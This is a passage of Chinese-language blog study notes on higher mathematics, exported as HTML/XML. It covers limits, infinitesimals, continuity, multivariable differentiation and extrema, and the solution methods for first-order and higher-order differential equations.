<h4 id="极限值与无穷小之间的关系"><a href="#极限值与无穷小之间的关系" class="headerlink" title="极限值与无穷小之间的关系"></a>极限值与无穷小之间的关系</h4><p>$\lim f(x)=A\Leftrightarrow f(x)=A+\alpha(x)$，其中$\lim\alpha(x)=0$</p>
<h3 id="极限存在准则"><a href="#极限存在准则" class="headerlink" title="极限存在准则"></a>极限存在准则</h3><h4 id="夹逼准则"><a href="#夹逼准则" class="headerlink" title="夹逼准则"></a>夹逼准则</h4><p>若存在N,当$n&gt;N$时，$x_n\le y_n\le z_n$,且$\lim\limits_{n\rightarrow\infty}y_n=\lim\limits_{n\rightarrow\infty}z_n=a$，则$\lim\limits_{n\rightarrow\infty}x_n=a$</p>
<h4 id="单调有界准则"><a href="#单调有界准则" class="headerlink" title="单调有界准则"></a>单调有界准则</h4><p>单调有界数列必有极限。即单调增、由上界的数列必有极限，单调减、有下界的数列必有极限</p>
<h4 id="极限存在"><a href="#极限存在" class="headerlink" title="极限存在"></a>极限存在</h4><ol>
<li>若$\lim\limits_{x\rightarrow a}f(x)=A,\lim\limits_{x\rightarrow a}g(x)不\exists$，则$\lim\limits_{x\rightarrow a}(f(x)+g(x))不\exists$，当$A\ne0$时，又有$\lim\limits_{x\rightarrow a}f(x)g(x)不\exists$;当A=0时，$\lim\limits_{x\rightarrow a}f(x)g(x)可能\exists$，也可能不$\exists$</li>
<li>若$\lim\limits_{x\rightarrow a}f(x),\lim\limits_{x\rightarrow a}g(x)均不\exists$，则$\lim\limits_{x\rightarrow a}(f(x)+g(x)),\lim\limits_{x\rightarrow a}f(x)g(x)可能\exists$，也可能不$\exists$</li>
</ol>
<h3 id="无穷小"><a href="#无穷小" class="headerlink" title="无穷小"></a>无穷小</h3><h4 id="无穷小的比较"><a href="#无穷小的比较" class="headerlink" title="无穷小的比较"></a>无穷小的比较</h4><p>设$\lim\alpha(x)=0,\lim\beta(x)=0$<br>(1) 高阶：若$\lim\frac{\beta(x)}{\alpha(x)}=0$，记为$\beta(x)=o(\alpha(x))$<br>(2) 同阶：若$\lim\frac{\beta(x)}{\alpha(x)}=C\ne0$<br>(3) 等价：若$\lim\frac{\beta(x)}{\alpha(x)}=1$，记为$\alpha(x)\sim\beta(x)$<br>(4) 无穷小的阶：若$\lim\frac{\beta(x)}{[\alpha(x)]^k}=C\ne0$，称$\beta(x)$是$\alpha(x)$的k阶无穷小</p>
<h4 id="无穷小的性质"><a href="#无穷小的性质" class="headerlink" title="无穷小的性质"></a>无穷小的性质</h4><ol>
<li><strong>有限个</strong>无穷小的和仍是无穷小</li>
<li><strong>有限个</strong>无穷小的积仍是无穷小</li>
<li>无穷小量与有界量的积仍是无穷小</li>
</ol>
<h3 id="无穷大"><a href="#无穷大" class="headerlink" title="无穷大"></a>无穷大</h3><h4 id="常用的一些无穷大的比较"><a href="#常用的一些无穷大的比较" class="headerlink" title="常用的一些无穷大的比较"></a>常用的一些无穷大的比较</h4><ol>
<li>当$x\rightarrow+\infty$时，$\ln^\alpha x\ll x^\beta\ll a^x$(其中$\alpha&gt;0,\beta&gt;0,a&gt;1$)</li>
<li>当$n\rightarrow\infty$时，$\ln^\alpha n\ll n^\beta\ll a^n\ll n!\ll n^n$(其中$\alpha&gt;0,\beta&gt;0,a&gt;1$)</li>
</ol>
<h4 id="无穷大与无界变量的关系-无穷大-Rightarrow-无界变量"><a href="#无穷大与无界变量的关系-无穷大-Rightarrow-无界变量" class="headerlink" title="无穷大与无界变量的关系 无穷大$\Rightarrow$ 无界变量"></a>无穷大与无界变量的关系 无穷大$\Rightarrow$ 无界变量</h4><p>数列${x_n}$是无穷大量：$\forall M&gt;0,\exists N$，当$n&gt;N$时，恒有$|x_n|&gt;M$<br>数列${x_n}$是无界变量：$\forall M&gt;0,\exists N$,使$|x_N|&gt;M$<br>无穷大量一定是无界变量，但无界变量不一定是无穷大量(例：$f(x)=\begin{cases}<br>   n ,n为奇数 \\<br>   0 ,n为偶数 \\<br>\end{cases}$)</p>
<h4 id="无穷大量与无穷小量的关系"><a href="#无穷大量与无穷小量的关系" class="headerlink" title="无穷大量与无穷小量的关系"></a>无穷大量与无穷小量的关系</h4><p>在自变量的同一变化过程中，若$f(x)$是无穷大，则$\frac{1}{f(x)}$是无穷小；若$f(x)$是无穷小，且$f(x)\ne0$，则$\frac{1}{f(x)}$是无穷大</p>
<h3 id="求极限的方法"><a href="#求极限的方法" class="headerlink" title="求极限的方法"></a>求极限的方法</h3><h4 id="利用有理运算法则求极限"><a href="#利用有理运算法则求极限" class="headerlink" title="利用有理运算法则求极限"></a>利用有理运算法则求极限</h4><p>若$\lim f(x)=A,\lim g(x)=B$，则</p>
<p>$\lim[f(x)\pm g(x)]=\lim f(x)\pm\lim g(x)=A\pm B$;</p>
<p>$\lim[f(x)\cdot g(x)]=\lim f(x)\cdot\lim g(x)=A\cdot B;\lim\frac{f(x)}{g(x)}=\frac{\lim f(x)}{\lim g(x)}=\frac{A}{B}(B\ne0)$</p>
<p>推论：</p>
<ol>
<li>若$\lim f(x)=A\ne0$，则$\lim f(x)g(x)=A\lim g(x);\lim\frac{g(x)}{f(x)}=\frac{1}{A}\lim g(x)$</li>
<li>若$\lim\frac{f(x)}{g(x)}$存在，且$\lim g(x)=0$，则$\lim f(x)=0$</li>
<li>若$\lim\frac{f(x)}{g(x)}=A\ne0$，且$\lim f(x)=0$，则$\lim g(x)=0$</li>
</ol>
<p>注：<br>若$\lim f(x)$存在，$\lim g(x)$不存在，则$\lim[f(x)\pm g(x)]$一定不存在<br>若$\lim f(x)$和$\lim g(x)$都不存在，则$\lim[f(x)\pm g(x)]$不一定存在</p>
<h4 id="利用基本极限求极限"><a href="#利用基本极限求极限" class="headerlink" title="利用基本极限求极限"></a>利用基本极限求极限</h4><p>常用的基本极限</p>
<p>$\sin x&lt;x&lt;\tan x,x\in(0,\frac{\pi}{2})$</p>
<p>$\frac{x}{1+x}&lt;\ln(1+x)&lt;x,x\in(0,+\infty)$</p>
<p>$\lim\limits_{x\rightarrow0}\frac{\sin x}{x}=1;\lim\limits_{x\rightarrow0}(1+x)^{\frac{1}{x}}=e;\lim\limits_{x\rightarrow\infty}(1+\frac{1}{x})^x=e$</p>
<p>$\lim\limits_{x\rightarrow0}\frac{a^x-1}{x}=\ln a(a&gt;0);\lim\limits_{n\rightarrow\infty}\sqrt[n]{n}=1$</p>
<script type="math/tex; mode=display">\lim\limits_{x\rightarrow\infty}\frac{a_nx^n+a_{n-1}x^{n-1}+\dotsb+a_1x+a_0 }{b_mx^m+b_{m-1}x^{m-1}+\dotsb+b_1x+b_0}=\begin{cases}
   \frac{a_n}{b_n},n=m\\
   0,n<m\\
   \infty,n>m
\end{cases}</script><script type="math/tex; mode=display">\lim\limits_{n\rightarrow\infty} x^n=\begin{cases}
   0,|x|<1 \\
   \infty, |x|>1 \\
   1, x=1 \\
   不存在, x=-1
\end{cases};\lim\limits_{n\rightarrow\infty} e^{nx}=\begin{cases}
   0,x<0 \\
   +\infty, x>0 \\
   1, x=0
\end{cases}</script><h4 id="利用等价无穷小代换求极限"><a href="#利用等价无穷小代换求极限" class="headerlink" title="利用等价无穷小代换求极限"></a>利用等价无穷小代换求极限</h4><p>常用等价无穷小<br>当 $x\rightarrow0$ 时</p>
<p>(1) $x\sim\sin x\sim\tan x\sim\arcsin x\sim\arctan x\sim\ln(1+x)\sim e^x-1,(1+x)^a-1\sim ax,1-\cos x\sim\frac{1}{2}x^2$，$a^x-1\sim x\ln a,1-\cos^\alpha x\sim\frac{\alpha}{2}x^2$</p>
<p>(2) $x-\sin x\sim\frac{x^3}{6},\arcsin x-x\sim\frac{x^3}{6},x-\ln(1+x)\sim\frac{x^2}{2},\tan x-x\sim\frac{x^3}{3},x-\arctan x\sim\frac{x^3}{3}$，若$\alpha(x)\rightarrow0,\alpha(x)\beta(x)\rightarrow0$，则$(1+\alpha(x))^{\beta(x)}-1\sim\alpha(x)\beta(x)、\ln(x+\sqrt{1+x^2})\sim x$</p>
<p>(3) 设f(x)和g(x)在x=0的某邻域内连续，且$\lim\limits\frac{f(x)}{g(x)}=1$，则$\int_0^xf(t)dt\sim\int_0^xg(t)dt$</p>
<p>等价无穷小代换的原则</p>
<p>1）乘、除关系可以换<br>若$\alpha\sim\alpha_1,\beta\sim\beta_1$，则$\lim\limits\frac{\alpha}{\beta}=\lim\limits\frac{\alpha_1}{\beta}=\lim\limits\frac{\alpha}{\beta_1}=\lim\limits\frac{\alpha_1}{\beta_1}$</p>
<p>2）加、减关系在一定条件下可以换<br>(1) 若$\alpha\sim\alpha_1,\beta\sim\beta_1$，且$\lim\limits\frac{\alpha_1}{\beta_1}=A\ne1$，则$\alpha-\beta\sim\alpha_1-\beta_1$</p>
<p>(2) 若$\alpha\sim\alpha_1,\beta\sim\beta_1$，且$\lim\limits\frac{\alpha_1}{\beta_1}=A\ne-1$，则$\alpha+\beta\sim\alpha_1+\beta_1$</p>
<h4 id="利用洛必达法则求极限"><a href="#利用洛必达法则求极限" class="headerlink" title="利用洛必达法则求极限"></a>利用洛必达法则求极限</h4><p>若<br>(1) $\lim\limits_{x\rightarrow x_0}f(x)=\lim\limits_{x\rightarrow x_0}g(x)=0(\infty)$;</p>
<p>(2) f(x)和g(x)在$x_0$的某去心邻域内可导，且$g’(x)\ne0$</p>
<p>(3) $\lim\limits_{x\rightarrow x_0}\frac{f’(x)}{g’(x)}$存在(或$\infty$)<br>则$\lim\limits_{x\rightarrow x_0}\frac{f(x)}{g(x)}=\lim\limits_{x\rightarrow x_0}\frac{f’(x)}{g’(x)}$</p>
<h4 id="利用泰勒公式求极限"><a href="#利用泰勒公式求极限" class="headerlink" title="利用泰勒公式求极限"></a>利用泰勒公式求极限</h4><p>设$f(x)$在$x=x_0$处n阶可导，则</p>
<script type="math/tex; mode=display">f(x)=f(x_0)+f'(x_0)(x-x_0)+\frac{f''(x_0)}{2!}(x-x_0)^2+\dotsb+\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n+o((x-x_0)^n)</script><p>当$x_0=0$时</p>
<script type="math/tex; mode=display">f(x)=f(0)+f'(0)x+\frac{f''(0)}{2!}x^2+\dotsb+\frac{f^{n}(0)}{n!}x^n+o(x^n)</script><p>常用的泰勒公式</p>
<p>(1) $e^x=1+x+\frac{x^2}{2!}+\dotsb+\frac{x^n}{n!}+o(x^n)$</p>
<p>(2) $\sin x=x-\frac{x^3}{3!}+\dotsb+(-1)^{n-1}\frac{x^{2n-1}}{(2n-1)!}+o(x^{2n-1})$</p>
<p>(3) $\cos x=1-\frac{x^2}{2!}+\dotsb+(-1)^n\frac{x^{2n}}{(2n)!}+o(x^{2n})$</p>
<p>(4) $\ln(1+x)=x-\frac{x^2}{2}+\dotsb+(-1)^{n-1}\frac{x^n}{n}+o(x^n)$</p>
<p>(5) $(1+x)^a=1+ax+\frac{a(a-1)}{2!}x^2+\dotsb+\frac{a(a-1\dotsb(a-n+1))}{n!}x^n+o(x^n)$</p>
<h4 id="利用夹逼准则求极限"><a href="#利用夹逼准则求极限" class="headerlink" title="利用夹逼准则求极限"></a>利用夹逼准则求极限</h4><h4 id="利用定积分的定义求极限"><a href="#利用定积分的定义求极限" class="headerlink" title="利用定积分的定义求极限"></a>利用定积分的定义求极限</h4><h4 id="利用单调有界准则求极限"><a href="#利用单调有界准则求极限" class="headerlink" title="利用单调有界准则求极限"></a>利用单调有界准则求极限</h4><p><img src="/2021/05/07/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E5%87%BD%E6%95%B0%E3%80%81%E8%BF%9E%E7%BB%AD%E3%80%81%E6%9E%81%E9%99%90/经典错误.png" alt="经典错误"></p>
<h3 id="函数极限的题型"><a href="#函数极限的题型" class="headerlink" title="函数极限的题型"></a>函数极限的题型</h3><h4 id="frac-0-0-型极限"><a href="#frac-0-0-型极限" class="headerlink" title="$\frac{0}{0}$ 型极限"></a>$\frac{0}{0}$ 型极限</h4><p>(1) 洛必达法则</p>
<p>(2) 等价无穷小代换</p>
<p>(3) 泰勒公式</p>
<h4 id="frac-infty-infty-型"><a href="#frac-infty-infty-型" class="headerlink" title="$\frac{\infty}{\infty}$ 型"></a>$\frac{\infty}{\infty}$ 型</h4><p>(1) 洛必达法则</p>
<p>(2) 分子分母同除以分子和分母各项中最高阶的无穷大</p>
<h4 id="infty-infty-型极限"><a href="#infty-infty-型极限" class="headerlink" title="$\infty-\infty$ 型极限"></a>$\infty-\infty$ 型极限</h4><p>(1) 通分化为$\frac{0}{0}$(适用于分式差)</p>
<p>(2) 根式有理化</p>
<p>(3) 提无穷因子，然后等价代换或变量代换、泰勒公式</p>
<h4 id="1-infty-型极限"><a href="#1-infty-型极限" class="headerlink" title="$1^\infty$ 型极限"></a>$1^\infty$ 型极限</h4><p>(1) 凑基本极限 $\lim[1+f(x)]^{\frac{1}{f(x)}}=e$，其中$\lim f(x)=0(f(x)\ne0)$</p>
<p>(2) 改写成指数 $\lim[f(x)]^{g(x)}=\lim e^{g(x)\ln f(x)}$，用洛必达法则</p>
<p>(3) 利用结论：若$\lim\alpha(x)=0,\lim\beta(x)=\infty,$且$\lim\alpha(x)\beta(x)=A$，则$\lim[1+\alpha(x)]^{\beta(x)}=e^A$</p>
<h3 id="无穷小量的比较"><a href="#无穷小量的比较" class="headerlink" title="无穷小量的比较"></a>无穷小量的比较</h3><p>结论：若$f(x)$在$x=0$的某邻域内连续，且当$x\rightarrow0$时$f(x)$是$x$的$m$阶无穷小，$\varphi(x)$是$x$的$n$阶无穷小，则当$x\rightarrow0$时$F(x)=\int_0^{\varphi(x)}f(t)dt$是$x$的$n(m+1)$阶无穷小</p>
<h2 id="连续"><a href="#连续" class="headerlink" title="连续"></a>连续</h2><h3 id="连续的概念"><a href="#连续的概念" class="headerlink" title="连续的概念"></a>连续的概念</h3><p>若$f(x)$在$x_0$某去心邻域有定义，但在$x_0$处不连续，则称点$x=x_0$为函数$f(x)$的间断点</p>
<h3 id="间断点及其类型"><a href="#间断点及其类型" class="headerlink" title="间断点及其类型"></a>间断点及其类型</h3><p>(1) 第一类间断点：左、右极限均存在的间断点<br>可去间断点：左、右极限存在且相等的间断点<br>跳跃间断点：左、右极限都存在但不相等的间断点<br>(2) 第二类间断点：左、右极限中至少有一个不存在的间断点<br>无穷间断点：左、右极限中至少有一个为无穷，如$x=0$为$f(x)=\frac{1}{x}$的无穷间断点</p>
<p>震荡间断点：如$x=0$为$f(x)=\sin\frac{1}{x}$的震荡间断点</p>
<h3 id="连续函数的性质"><a href="#连续函数的性质" class="headerlink" title="连续函数的性质"></a>连续函数的性质</h3><ol>
<li>连续函数的和、差、积(分母不为零)仍复合连续</li>
<li>基本初等函数在定义域内连续；初等函数在其定义区间内连续</li>
<li>闭区间上连续函数的性质<ol>
<li>有界性：若$f(x)$在$[a,b]$上连续，则$f(x)$在$[a,b]$上有界</li>
<li>最值性：若$f(x)$在$[a,b]$上连续，则$f(x)$在$[a,b]$上必有最大值和最小值</li>
<li>若$f(x)$在$[a,b]$上连续，且$f(x)\ne f(b)$，则对$f(a)$与$f(b)$之间任一数C，至少存在一个$\xi\in(a,b)$,使得$f(\xi)=C$<br>推论：若$f(x)$在$[a,b]$上连续，则$f(x)$在$[a,b]$可取到介于最小值m与最大值M之间的任何值</li>
</ol>
</li>
<li>零点定理：若$f(x)$在$[a,b]$上连续，且$f(a)\cdot f(b)&lt;0$，则必存在$\xi\in(a,b)$，使$f(\xi)=0$</li>
</ol>
<p>关于f(x)在(a,b)上有原函数F(x)，要注意以下几点：在(a,b)上</p>
<ol>
<li>f(x)不一定连续 例：$F(x)=\begin{cases}x^2\sin\frac{1}{x} &amp;x\ne0 \\0 &amp;x=0\end{cases}$<ol>
<li>f(x)在$x_0$处为可去间断点，原函数$F(x)$在$x_0$处可导</li>
<li>f(x)在$x_0$处为跳跃间断点，则原函数F(x)在$x_0$处不可导</li>
</ol>
</li>
<li>f(x)不一定是初等函数$\int e^{-x^2}dx$</li>
<li>F(x)不一定是初等函数</li>
</ol>
<p>f(x)在[a,b]连续，$f(x)\ge0$，且$f(x)\not\equiv0$，则$\int_a^bf(x)dx&gt;0$</p>
<h3 id="判定-f-x-在区间上有界"><a href="#判定-f-x-在区间上有界" class="headerlink" title="判定$f(x)$在区间上有界"></a>判定$f(x)$在区间上有界</h3><ol>
<li>利用定理，若$f(x)$在闭区间[a,b]上连续，则$f(x)$在[a,b]上有界</li>
<li>若$f(x)$在开区间(a,b)内连续，且$\lim\limits_{x\rightarrow a^+}f(x),\lim\limits_{x\rightarrow b^-}f(x)$都存在，则$f(x)$在(a,b)内有界，(a,b)为无穷区间也成立</li>
<li>若$f’(x)$在有限区间(a,b)内有界，则$f(x)$在(a,b)内有界</li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高等数学</tag>
      </tags>
  </entry>
  <entry>
    <title>高等数学-多元函数微分学</title>
    <url>/2021/06/11/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6/</url>
    <content><![CDATA[<h2 id="重极限、连续、偏导数、全微分"><a href="#重极限、连续、偏导数、全微分" class="headerlink" title="重极限、连续、偏导数、全微分"></a>重极限、连续、偏导数、全微分</h2><h3 id="重极限"><a href="#重极限" class="headerlink" title="重极限"></a>重极限</h3><h4 id="求重极限常用方法"><a href="#求重极限常用方法" class="headerlink" title="求重极限常用方法"></a>求重极限常用方法</h4><ol>
<li>利用极限性质（四则运算法则，夹逼定理）</li>
<li>消去分母中极限为零的因子（有理化，等价无穷小代换）</li>
<li>利用无穷小量与有界变量之积的无穷小量</li>
</ol>
<p><strong>证明重极限不存在常用方法</strong><br>沿两种不同路径极限不同（通常可取过($x_0,y_0$)的直线)</p>
<h3 id="连续"><a href="#连续" class="headerlink" title="连续"></a>连续</h3><p>若$\lim\limits_{\substack{x\rightarrow x_0 \\y\rightarrow y_0}}f(x,y)=f(x_0,y_0)$，则称$f(x,y)$在$(x_0,y_0)$处连续</p>
<h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><ol>
<li>连续函数的和、差、积、商（分母不为零）及复合仍连续</li>
<li>基本初等函数在其定义域内连续；初等函数在其定义区域内连续</li>
<li>有界闭区域上连续函数的性质<ol>
<li>有界性：若$f(x,y)$在有界闭区域D上连续，则$f(x,y)$在D上有界</li>
<li>最值性：若$f(x,y)$在有界闭区域D上连续，则$f(x,y)$在D上必有最大值和最小值</li>
<li>介值性：若$f(x,y)$在有界闭区域D上连续，则$f(x,y)$在D上可取到介于最小值与最大值之间的任何值</li>
</ol>
</li>
</ol>
<h3 id="偏导数"><a href="#偏导数" class="headerlink" title="偏导数"></a>偏导数</h3><h3 id="全微分"><a href="#全微分" class="headerlink" title="全微分"></a>全微分</h3><h4 id="以下四条等价"><a href="#以下四条等价" class="headerlink" title="以下四条等价"></a>以下四条等价</h4><ol>
<li>$\Delta z=f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)=A\Delta x+B\Delta y+o(\rho)$</li>
<li>$\lim\limits_{\substack{\Delta x\rightarrow0 \\ \Delta y\rightarrow0}}\frac{[f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)]-[A\Delta x+B\Delta y]}{\sqrt{(\Delta x)^2+(\Delta y)^2}}=0$</li>
<li>$\Delta z=f(x,y)-f(x_0,y_0)=A(x-x_0)+B(y-y_0)+o(\rho)$</li>
<li>$\lim\limits_{\substack{x\rightarrow x_0\\y\rightarrow y_0}}\frac{[f(x,y)-f(x_0,y_0)]-[A(x-x_0)+B(y-y_0)]}{\sqrt{(x-x_0)^2+(y-y_0)^2}}=0$</li>
</ol>
<h4 id="可微性判定"><a href="#可微性判定" class="headerlink" title="可微性判定"></a>可微性判定</h4><ol>
<li>必要条件：$f’_x(x_0,y_0)$与$f’_y(x_0,y_0)$都存在</li>
<li>充分条件：$f’_x(x_0,y_0)$和$f’_y(x_0,y_0)$在$(x_0,y_0)$连续</li>
<li>用定义判定<ol>
<li>$f’_x(x_0,y_0)$和$f’_y(x_0,y_0)$是否都存在</li>
<li>$\lim\limits_{\substack{\Delta x\rightarrow0 \\ \Delta y\rightarrow0}}\frac{[f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)]-[f’_x(x_0,y_0)\Delta x+f’_y(x_0,y_0)\Delta y]}{\sqrt{(\Delta x)^2+(\Delta y)^2}}$是否为零</li>
</ol>
</li>
</ol>
<h4 id="连续、可导、可微的关系"><a href="#连续、可导、可微的关系" class="headerlink" title="连续、可导、可微的关系"></a>连续、可导、可微的关系</h4><p><img src="/2021/06/11/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6/连续、可导、可微关系.png" alt="photo"></p>
<h2 id="偏导数与全微分的计算"><a href="#偏导数与全微分的计算" class="headerlink" title="偏导数与全微分的计算"></a>偏导数与全微分的计算</h2><h3 id="复合函数求导"><a href="#复合函数求导" class="headerlink" title="复合函数求导"></a>复合函数求导</h3><p>设$u=u(x,y),v=v(x,y)$可导，$z=f(u,v)$在相应点有连续一阶偏导数，则</p>
<script type="math/tex; mode=display">\frac{\delta z}{\delta x}=\frac{\delta f}{\delta u}\frac{\delta u}{\delta x}+\frac{\delta f}{\delta v}\frac{\delta v}{\delta x} \\ \frac{\delta z}{\delta y}=\frac{\delta f}{\delta u}\frac{\delta u}{\delta y}+\frac{\delta f}{\delta v}\frac{\delta v}{\delta y}\\</script><h3 id="隐函数求导法"><a href="#隐函数求导法" class="headerlink" title="隐函数求导法"></a>隐函数求导法</h3><p>由一个方程所确定的隐函数<br>设$F(x,y,z)$有连续一阶偏导数，$F’_z\ne0,z=z(x,y)$由$F(x,y,z)=0$所确定<br><strong>方法：</strong></p>
<ol>
<li>公式：$\frac{\delta z}{\delta x}=-\frac{F’_x}{F’_z},\frac{\delta z}{\delta y}=-\frac{F’_y}{F’_z}$</li>
<li>等式两边求导$F’_x+F’_z\frac{\delta z}{\delta x}=0,F’_y+F’_z\frac{\delta z}{\delta y}=0$</li>
<li>利用微分形式不变性：$F’_xdx+F’_ydy+F’_zdz=0$</li>
</ol>
<p>注：<br>若$p(x,y)$和$Q(x,y)$有一阶连续偏导数，且$P(x,y)dx+Q(x,y)dy$是某一函数的全微分，则$\frac{\delta P}{\delta y}=\frac{\delta Q}{\delta x}$</p>
<h2 id="极值与最值"><a href="#极值与最值" class="headerlink" title="极值与最值"></a>极值与最值</h2><h3 id="无条件极值"><a href="#无条件极值" class="headerlink" title="无条件极值"></a>无条件极值</h3><p><strong>极值的必要条件</strong><br>设$z=f(x,y)$在点$(x_0,y_0)$存在偏导数，且$(x_0,y_0)$为$f(x,y)$的极值点，则$f’_x(x_0,y_0)=0,f’_y(x_0,y_0)=0$</p>
<p><strong>极值的充分条件</strong><br>设$z=f(x,y)$在点$P_0(x_0,y_0)$的某邻域内有二阶连续偏导数，又$f’_x(x_0,y_0),f’_y(x_0,y_0)=0$，记$A=f’’_{xx}(x_0,y_0),B=f’’_{xy}(x_0,y_0),C=f’’_{yy}(x_0,y_0)$<br>有下列结论</p>
<ol>
<li>若$AC-B^2&gt;0,$则$(x_0,y_0)$为f(x,y)的极值点<ol>
<li>A&lt;0,则$(x_0,y_0)$为f(x,y)的极大值点</li>
<li>A&gt;0,则$(x_0,y_0)$为f(x,y)的极小值点</li>
</ol>
</li>
<li>若$AC-B^2&lt;0$，则$(x_0,y_0)$不为f(x,y)的极值点</li>
<li>若$AC-B^2=0$，则$(x_0,y_0)$可能为f(x,y)的极值点，也可能不为f(x,y)的极值点</li>
</ol>
<p>求具有二阶连续偏导数二元函数$z=f(x,y)$极值的一般步骤为：<br>(1) 求出f(x,y)的驻点$P_1,\dotsb,P_k$<br>(2) 利用极值的充分条件判定驻点$P_i$是否为极值点<br>二元函数$z=f(x,y)$在偏导数不存在的点也可能取到极值（如$f(x,y)=\sqrt{x^2+y^2}$，而这种点是否取得极值一般用极值定义判定</p>
<h3 id="条件极值及拉格朗日乘数法"><a href="#条件极值及拉格朗日乘数法" class="headerlink" title="条件极值及拉格朗日乘数法"></a>条件极值及拉格朗日乘数法</h3><p>求$z=f(x,y)$在条件$\varphi(x,y)=0$下的条件极值的一般方法：<br>(1) 构造拉格朗日函数$F(x,y,\lambda)=f(x,y)+\lambda\varphi(x,y)$；<br>(2) 将$F(x,y,\lambda)$分别对$x,y,\lambda$求偏导数，构造方程组</p>
<script type="math/tex; mode=display">\begin{cases}
   f'_x(x,y)+\lambda\varphi'_x(x,y)=0 \\
   f'_y(x,y)+\lambda\varphi'_y(x,y)=0 \\
   \varphi(x,y)=0 \\
\end{cases}</script><h3 id="最大最小值"><a href="#最大最小值" class="headerlink" title="最大最小值"></a>最大最小值</h3><p>求连续函数$f(x,y)$在有界闭区域D上的最大最小值三部曲<br>(1) 求f(x,y)在D内部可能的极值点<br>(2) 求f(x,y)在D的边界上的最大最小值<br>(3) 比较</p>
<p>应用题</p>
<p>点到直线的距离公式:<br>直线为$Ax+By+C=0,A,B\ne0$，则直线外一点$(x_0,y_0)$到该直线最短的距离为$d=\frac{Ax_0+By_0+C}{\sqrt{A^2+B^2}}$</p>
<p>三角形面积公式：海伦公式<br>设三角形三边为x,y,z,周长为2p，则面积为$S=\sqrt{p(p-a)(p-b)(p-c)}$</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高等数学</tag>
      </tags>
  </entry>
  <entry>
    <title>高等数学-常微分方程</title>
    <url>/2021/05/31/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E5%B8%B8%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="一阶微分方程的种类与解法"><a href="#一阶微分方程的种类与解法" class="headerlink" title="一阶微分方程的种类与解法"></a>一阶微分方程的种类与解法</h2><div class="table-container">
<table>
<thead>
<tr>
<th>种类</th>
<th>通解公式或解法</th>
</tr>
</thead>
<tbody>
<tr>
<td>可分离变量的微分方程<br>$\frac{dy}{dx}=f(x,y)$,其中$f(x,y)=\varPhi_1(x)\varPhi_2(y)$</td>
<td>解法：<br> $\frac{dy}{dx}=f(x,y)\implies\frac{dy}{dx}=\varPhi_1(x)\varPhi_2(y)$ <br> $\implies\frac{dy}{\varPhi_2(y)}=\varPhi_1(x)dx$ <br> $\implies\int\frac{dy}{\varPhi_2(y)}=\int\varPhi_1(x)dx+C$</td>
</tr>
<tr>
<td>齐次微分方程<br>$\frac{dy}{dx}=f(x,y)$，其中$f(x,y)=\varPhi(\frac{y}{x})$</td>
<td>解法：<br> $\frac{dy}{dx}=f(x,y)\implies\frac{dy}{dx}=\varPhi(\frac{y}{x})$<br>$\xRightarrow{\frac{y}{x}=u} u+x\frac{du}{dx}=\varPhi(u)$<br>$\implies \int \frac{du}{\varPhi(u)-u}=\int \frac{dx}{x}+C$</td>
</tr>
<tr>
<td>一阶齐次线性微分方程<br>$\frac{dy}{dx}+P(x)y=0$</td>
<td>通解公式：<br> $y = Ce^{-\int P(x)dx}$(其中C为任意常数)</td>
</tr>
<tr>
<td>一阶非齐次线性微分方程 <br> $\frac{dy}{dx}+P(x)y=Q(x)$</td>
<td>通解公式：<br> $y=[\int Q(x)e^{\int P(x)dx}dx+C]e^{-\int P(x)dx}$(其中C为任意常数)</td>
</tr>
</tbody>
</table>
</div>
<h2 id="可降阶的高阶微分方程及解法"><a href="#可降阶的高阶微分方程及解法" class="headerlink" title="可降阶的高阶微分方程及解法"></a>可降阶的高阶微分方程及解法</h2><div class="table-container">
<table>
<thead>
<tr>
<th>种类</th>
<th>解法</th>
</tr>
</thead>
<tbody>
<tr>
<td>$y^{(n)}=f(x)$</td>
<td>$y^{(n)}=f(x)$进行n次不定积分</td>
</tr>
<tr>
<td>$f(x,y’,y’’)=0$</td>
<td>令$y’=p,y’’=\frac{dp}{dx},f(x,y’,y’’)=0$化为$f(x,p,\frac{dp}{dx})=0$</td>
</tr>
<tr>
<td>$f(y,y’,y’’)=0$</td>
<td>$y’=p,y’’=\frac{dy}{dx}\cdot\frac{dp}{dy}=p\frac{dp}{dy},f(y,y’,y’’)=0$化为$f(y,p,p\frac{dp}{dy})=0$</td>
</tr>
</tbody>
</table>
</div>
<h2 id="高阶线性微分方程理论"><a href="#高阶线性微分方程理论" class="headerlink" title="高阶线性微分方程理论"></a>高阶线性微分方程理论</h2><p><strong>n阶齐次线性微分方程</strong><br>形如</p>
<script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=0 \tag{1}</script><p><strong>n阶非齐次线性微分方程</strong><br>形如</p>
<script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=f(x) \tag{2}</script><p>若$f(x)=f_1(x)+f_2(x)$,则(2)可分解为如下两个方程：</p>
<script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=f_1(x) \tag{2.1}</script><script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=f_2(x) \tag{2.2}</script><h3 id="高阶线性微分方程解的结构"><a href="#高阶线性微分方程解的结构" class="headerlink" title="高阶线性微分方程解的结构"></a>高阶线性微分方程解的结构</h3><ol>
<li>设$\varPhi_1(x),\varPhi_2(x),…,\varPhi_s(x)$为(1)的一组解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_s\varPhi_s(x)$也为方程(1)的解</li>
